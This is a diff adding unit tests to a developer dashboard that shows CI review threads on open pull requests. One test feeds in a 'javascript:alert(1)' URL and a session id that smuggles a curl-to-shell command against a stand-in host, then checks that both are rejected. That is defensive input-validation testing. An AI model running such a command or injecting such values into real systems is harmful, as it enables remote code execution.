@@ -24,6 +24,7 @@ import { hasConductorWindow, transcriptDir } from '../claude/session-runtime.ser
 import {
   blockedReason,
   buildDashboardSnapshot,
+  type CiReview,
   findStalledSessions,
   fleetSummary,
   goalHeadline,
@@ -1298,6 +1299,77 @@ describe('needsYou', () => {
       expect(need?.answer).toBe('(session id outside the minted shape; inspect the store)');
     },
   );
+
+  // Decision 90: `pup status` asks GitHub what the CI review left on each open
+  // PR, and the line says it, with `pup fix` as the answer to open threads.
+  describe('with the CI review pup status asks for', () => {
+    const PR = (n: number) => `https://github.com/o/r/pull/${n}`;
+
+    it('names the open threads with pup fix, and a clean head as ready to merge', () => {
+      seedMerge('s-threads', PR(7));
+      seedMerge('s-one', PR(8));
+      seedMerge('s-clean', PR(9));
+      seedMerge('s-unknown', PR(10));
+      const reviews: Record<string, CiReview> = {
+        's-threads': { openThreads: 2 },
+        's-one': { openThreads: 1 },
+        's-clean': { openThreads: 0 },
+      };
+
+      const needs = needsYou(buildDashboardSnapshot(db, repo, NOW), (row) => reviews[row.id]);
+
+      expect(needs).toHaveLength(4);
+      expect(needs).toEqual(
+        expect.arrayContaining([
+          {
+            kind: 'pr-open',
+            sessionId: 's-threads',
+            label: 's-threads',
+            reason: 'CI review left 2 open threads on its head',
+            answer: 'pup fix s-threads',
+          },
+          expect.objectContaining({
+            sessionId: 's-one',
+            reason: 'CI review left 1 open thread on its head',
+          }),
+          {
+            kind: 'pr-open',
+            sessionId: 's-clean',
+            label: 's-clean',
+            // Any workflow in the repo can set the status as the bot (decision 90).
+            reason:
+              'CI review status reads clean on its head (any repo workflow can set it): ' +
+              'read the PR, then your merge click',
+            answer: PR(9),
+          },
+          {
+            kind: 'pr-open',
+            sessionId: 's-unknown',
+            label: 's-unknown',
+            reason: 'PR opened, not landed',
+            answer: PR(10),
+          },
+        ]),
+      );
+    });
+
+    it('asks nothing for a url outside the pull-request shape or an id outside the minted one', () => {
+      seedMerge('s-bad-url', 'javascript:alert(1)');
+      seedMerge('x;curl evil|sh;#', PR(7));
+      const asked: string[] = [];
+
+      const needs = needsYou(buildDashboardSnapshot(db, repo, NOW), (row) => {
+        asked.push(row.id);
+        return { openThreads: 3 };
+      });
+
+      expect(asked).toEqual([]);
+      expect(needs.map((need) => need.reason)).toEqual([
+        'PR opened, not landed',
+        'PR opened, not landed',
+      ]);
+    });
+  });
 
   it('prints a pull request url with a port, as an enterprise host has', () => {
     seedMerge('s-ghe', 'https://ghe.corp:8443/o/r/pull/3');
